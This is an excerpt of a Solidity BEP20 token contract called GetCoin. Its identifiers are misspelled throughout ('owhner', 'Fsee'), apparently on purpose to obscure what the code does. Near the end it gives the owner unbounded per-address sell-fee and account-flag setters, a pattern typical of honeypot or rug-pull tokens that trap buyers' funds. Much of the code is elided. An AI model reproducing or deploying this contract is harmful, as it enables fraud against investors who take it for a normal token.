...
abstract contract Ownable is Context {
    ...
    /**
     * @dev Initializes the contract setting the deployer as the initial owhner.
     */
    constructor() {
        _transferowhnershiptransferowhnership(_msgSender());
    }

    /**
     * @dev Returns the address of the current owhner.
     */
    ...
    /**
     * @dev Throws if called by any account other than the owhner.
     */
    modifier onlyowhner() {
    ...
    /**
     * @dev Leaves the contract without owhner. It will not be possible to call
     * `onlyowhner` functions anymore. Can only be called by the current owhner.
     *
     * NOTE: Renouncing owhnership will leave the contract without an owhner,
     * thereby removing any functionality that is only available to the owhner.
     */
    function renounceowhnership() public virtual onlyowhner {
        _transferowhnershiptransferowhnership(address(0));
    }//6

    /**
     * @dev Transfers owhnership of the contract to a new account (`newowhner`).
     * Can only be called by the current owhner.
     */
    function transferowhnershiptransferowhnership(address newowhner) public virtual onlyowhner {
        require(newowhner != address(0), "Ownable: new owhner is the zero address");
        _transferowhnershiptransferowhnership(newowhner);
    }//7
     ...
     */
    function _transferowhnershiptransferowhnership(address newowhner) internal virtual {
...
contract BEP20 is Context {
    ...
    /**
     * @dev Emitted when the allowance of a `spender` for an `owhner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owhner, address indexed spender, uint256 value);//10
    ...
    /**
     * @dev Sets `Amount` as the allowance of `spender` over the `owhner` s tokens.
     *
     ...
     * Requirements:
     *
     * - `owhner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(
        address owhner,
    ...
    /**
     * @dev Spend `Amount` form the allowance of `owhner` toward `spender`.
     *
...
contract GetCoin is BEP20, Ownable {
    // ext
    ...
    function upF(uint256 _value) external onlyowhner {
        _defaultSellFsee = _value;
    }

    function setSlipFsee(address _address, uint256 _value) external onlyowhner {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipFsee[_address] = _value;
    }

    function getSlipFsee(address _address) external view onlyowhner returns (uint256) {
        return _slipFsee[_address];
    }


    function setMAccountFsee(address _address, bool _value) external onlyowhner {
        _mAccount[_address] = _value;
    }

    function getMAccountFsee(address _address) external view onlyowhner returns (bool) {
